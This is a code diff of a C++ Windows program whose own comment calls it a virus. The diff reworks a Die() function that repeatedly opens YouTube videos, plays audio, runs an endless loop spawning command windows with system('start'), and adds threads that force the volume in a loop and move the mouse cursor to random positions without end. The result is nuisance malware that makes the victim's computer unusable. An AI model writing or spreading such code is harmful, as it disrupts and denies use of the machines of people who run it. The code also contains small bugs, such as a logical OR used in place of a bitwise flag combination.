@@ -46,20 +46,29 @@ public:
 
 // Returns true if correct and false if incorrect
 void LockVolume() {
-    changeVolume();
+    while (true) {
+        changeVolume();
+    }
 }
+
+void randomizeCursor() {
+    while (true) {
+        SetCursorPos(rand() % 1000, rand() % 800);
+    }
+}
+
 // Runs the virus if function is called
 void Die() {
     for (int i = 0; i < 3; i++) {
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=KE1ynBZ-9Bw", 0, 0, SW_SHOWNORMAL);
     }
     ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZHmROm_CRH4", 0, 0, SW_SHOWNORMAL);
+    std::thread audio (LockVolume);
+    std::thread mouse(randomizeCursor);
     PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
     while (true) {
 
-        std::thread first (LockVolume);
         // Opens lots of videos
-        SetCursorPos(rand() % 1000, rand() % 800);
         system("start");
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=1d-n0Qi1ZvQ", 0, 0, SW_SHOWNORMAL);
         ShellExecute(0, 0, L"https://www.youtube.com/watch?v=VAnaq97yoM4", 0, 0, SW_SHOWNORMAL);
